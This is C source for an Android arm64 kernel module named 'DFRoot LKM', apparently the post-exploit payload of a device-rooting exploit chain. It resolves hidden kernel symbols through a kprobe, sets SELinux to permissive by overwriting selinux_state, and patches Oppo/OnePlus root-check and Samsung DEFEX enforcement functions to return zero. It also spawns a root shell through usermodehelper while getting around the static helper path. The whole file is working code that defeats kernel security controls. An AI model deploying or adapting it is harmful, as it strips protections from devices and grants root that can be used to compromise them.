#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/namei.h>
#include <linux/ptrace.h>
#include <linux/slab.h>
#include <asm/cpufeature.h>
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("DFRoot LKM");

/* The exploit passes the manager package and the two switches through insmod
 * parameters (the shellcode builds the insmod argv from its string slots).
 * flags bit0 soft reboot, bit1 disable modules. The staged ksud path is not
 * passed on the command line: it rides in a 160-byte slot inside this image
 * that the exploit overwrites before writing the module out, so it has to be
 * a real initialized array, not a pointer. */
static char package_name[64] = "";
module_param_string(package_name, package_name, sizeof(package_name), 0);
static char ksud_path[160] = "DFROOT_KSUD_PATH_SLOT";
static int flags;
module_param(flags, int, 0);

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
typedef unsigned long (*module_kallsyms_lookup_name_t)(const char *name);
typedef void *(*umh_setup_t)(const char *path, char **argv, char **envp, gfp_t gfp,
                             void *init, void *cleanup, void *data);
typedef int (*umh_exec_t)(void *info, int wait);
typedef int  (*kern_path_t)(const char *, unsigned int, struct path *);
typedef int  (*invalidate_t)(struct address_space *);
typedef void (*path_put_t)(const struct path *);
typedef int  (*insn_patch_t)(void *addrs[], u32 insns[], int cnt);

static insn_patch_t insn_patch_text;

static __nocfi void patch_fn_ret_zero(void *fn)
{
    u32  insn  = *(u32 *)fn;
    int  skip  = 0;
    bool pac_a = false, pac_b = false;
    void *addrs[2];
    u32   insns[2];

    while (skip < 2) {
        switch (insn) {
        case 0xD503233F: pac_a = true; goto skip_insn; /* PACIASP */
        case 0xD503237F: pac_b = true; goto skip_insn; /* PACIBSP */
        case 0xD503241F:                               /* BTI     */
        case 0xD503245F:                               /* BTI c   */
        case 0xD503249F:                               /* BTI j   */
        case 0xD50324DF:                               /* BTI jc  */
        skip_insn:
            insn = *(u32 *)((u8 *)fn + ++skip * 4);
            continue;
        }
        break;
    }

    addrs[0] = (u8 *)fn + skip * 4;
    addrs[1] = (u8 *)fn + skip * 4 + 4;
    insns[0] = 0xD2800000;
    /* PACIASP/PACIBSP are hint-space NOPs on CPUs without ARMv8.3 pointer auth,
     * but RETAA/RETAB are not — they fault as undefined. Only emit them when
     * hardware auth is actually present and the signed LR needs stripping. */
    insns[1] = (pac_b && system_supports_address_auth()) ? 0xD65F0FFF :
               (pac_a && system_supports_address_auth()) ? 0xD65F0BFF :
                                                           0xD65F03C0;

    if (insn_patch_text(addrs, insns, 2))
        pr_warn("dfroot: patch failed at %px\n", fn);
}

static int __nocfi __init dfroot_init(void)
{
    kallsyms_lookup_name_t get_addr;
    kern_path_t  kern_path_fn;
    invalidate_t invalidate_fn;
    path_put_t   path_put_fn;
    struct path  p;
    umh_setup_t umh_setup;
    umh_exec_t  umh_exec;
    bool *selinux_state;
    module_kallsyms_lookup_name_t mkln;
    struct kprobe kln_kp;
    void *oplus_exe_fn, *oplus_root_fn, *defex_enforce_fn, *defex_umh_fn;
    void *info;
    int ret;

    // UMH command to run. The chisewaguri architecture: the module execs the
    // staged ksud directly, so no bootstrap binary and no prefs parsing ever
    // run on the root side - everything arrives via the insmod parameters
    // above. The helper is UMH_WAIT_EXEC so no child exit status is left to
    // leak (the old UMH_WAIT_PROC wait was half of the MTK reboot, #5).
    //
    // Marker hygiene (WorldMargin): /dev is a tmpfs the framework soft-reboot
    // never clears, so markers from a failed run would block every rerun
    // until a power cycle. They are cleared up front and again on the failure
    // path, where /dev/df is removed last so the one-shot mutex lets the next
    // run through; the shellcode recreates it if the hook is still live.
    static const char sh[] = "/system/bin/sh";
    static char cmd[1024];
    static char *envp[] = { "PATH=/system/bin", NULL };
    static char *argv[] = { (char *)sh, "-c", cmd, NULL };
    snprintf(cmd, sizeof(cmd),
        "rm -f /dev/df /dev/dfm*;"
        " touch /dev/dfm0;"
        "%s"
        " touch /dev/dfm5;"
        " if \"%s\" late-load --package-name \"%s\"; then"
        "  touch /dev/dfm6;"
        "  if [ %d -ne 0 ]; then"
        "   i=0;"
        "   while pgrep -f 'ksud late-load' >/dev/null 2>&1 && [ $i -lt 30 ];"
        "    do sleep 1; i=$((i+1)); done;"
        "   \"%s\" soft-reboot;"
        "  fi;"
        " else"
        "  rm -f /dev/df /dev/dfm*; touch /dev/dfme2;"
        " fi",
        (flags & 2)
            ? " touch /dev/dfm4;"
              " for d in /data/adb/modules/*/; do"
              "  [ -d \"$d\" ] && touch \"$d/disable\"; done;"
            : "",
        ksud_path, package_name, flags & 1, ksud_path);

    // Symbol finder
    kln_kp = (struct kprobe){ .symbol_name = "kallsyms_lookup_name" };
    if (register_kprobe(&kln_kp) < 0) {
        pr_err("dfroot: kallsyms_lookup_name not found\n");
        return -EINVAL;
    }
    get_addr = (kallsyms_lookup_name_t)kln_kp.addr;
    unregister_kprobe(&kln_kp);

    insn_patch_text = (insn_patch_t)get_addr("aarch64_insn_patch_text");
    if (!insn_patch_text) {
        pr_err("dfroot: aarch64_insn_patch_text not found\n");
        return -EINVAL;
    }

    mkln = (module_kallsyms_lookup_name_t)get_addr("module_kallsyms_lookup_name");

    // Invalidate page_cache for crash_dump64
    // NOTE: this can cause issues if a process is currently executing
    //   crash_dump64. We may want to revert to manual restore patching
    kern_path_fn  = (kern_path_t) get_addr("kern_path");
    invalidate_fn = (invalidate_t)get_addr("invalidate_inode_pages2");
    path_put_fn   = (path_put_t)  get_addr("path_put");
    if (!kern_path_fn || !invalidate_fn || !path_put_fn) {
        pr_err("dfroot: cache drop symbols missing\n");
    } else if (kern_path_fn("/apex/com.android.runtime/bin/crash_dump64",
                            LOOKUP_FOLLOW, &p)) {
        pr_err("dfroot: kern_path failed for crash_dump64\n");
    } else {
        invalidate_fn(p.dentry->d_inode->i_mapping);
        path_put_fn(&p);
        pr_info("dfroot: cleared page cache for crash_dump64\n");
    }

    // Disable SELinux
    selinux_state = (bool *)get_addr("selinux_state");
    if (!selinux_state) {
        pr_err("dfroot: selinux_state not found\n");
        return -EINVAL;
    }
    WRITE_ONCE(*selinux_state, false);
    pr_info("dfroot: selinux_state permissive\n");

    // Oppo/OnePlus
    oplus_exe_fn = (void *)(mkln ? mkln("oplus_exe_block_ret_handler") : 0);
    if (!oplus_exe_fn)
        pr_err("dfroot: oplus_exe_block_ret_handler not found, skipping\n");
    else {
        patch_fn_ret_zero(oplus_exe_fn);
        pr_info("dfroot: oplus_exe_block_ret_handler patched\n");
    }

    oplus_root_fn = (void *)(mkln ? mkln("oplus_root_check_post_handler") : 0);
    if (!oplus_root_fn)
        pr_err("dfroot: oplus_root_check_post_handler not found, skipping\n");
    else {
        patch_fn_ret_zero(oplus_root_fn);
        pr_info("dfroot: oplus_root_check_post_handler patched\n");
    }

    // Samsung
    defex_enforce_fn = (void *)get_addr("task_defex_enforce");
    if (!defex_enforce_fn)
        pr_err("dfroot: task_defex_enforce not found, skipping\n");
    else {
        patch_fn_ret_zero(defex_enforce_fn);
        pr_info("dfroot: task_defex_enforce patched\n");
    }

    defex_umh_fn = (void *)get_addr("task_defex_user_exec");
    if (!defex_umh_fn)
        pr_err("dfroot: task_defex_user_exec not found, skipping\n");
    else {
        patch_fn_ret_zero(defex_umh_fn);
        pr_info("dfroot: task_defex_user_exec patched\n");
    }

    // Run UMH command
    umh_setup = (umh_setup_t)get_addr("call_usermodehelper_setup");
    umh_exec  = (umh_exec_t)get_addr("call_usermodehelper_exec");
    if (!umh_setup || !umh_exec) {
        pr_err("dfroot: usermodehelper symbols missing (setup=%px exec=%px)\n",
               umh_setup, umh_exec);
        return -EINVAL;
    }

    info = umh_setup(sh, argv, envp, GFP_KERNEL, NULL, NULL, NULL);
    if (!info) {
        pr_err("dfroot: usermodehelper_setup: returned NULL\n");
        return -EINVAL;
    }
    // bypass CONFIG_STATIC_USERMODEHELPER_PATH="" overriding path to ""
    ((struct subprocess_info *)info)->path = sh;

    ret = umh_exec(info, UMH_WAIT_EXEC);
    pr_info("dfroot: usermodehelper_exec returned %d\n", ret);
    
    return -ENODEV; /* return any error to unload module */
}

/* no module_exit: we never unload; saves .exit sections */
module_init(dfroot_init);
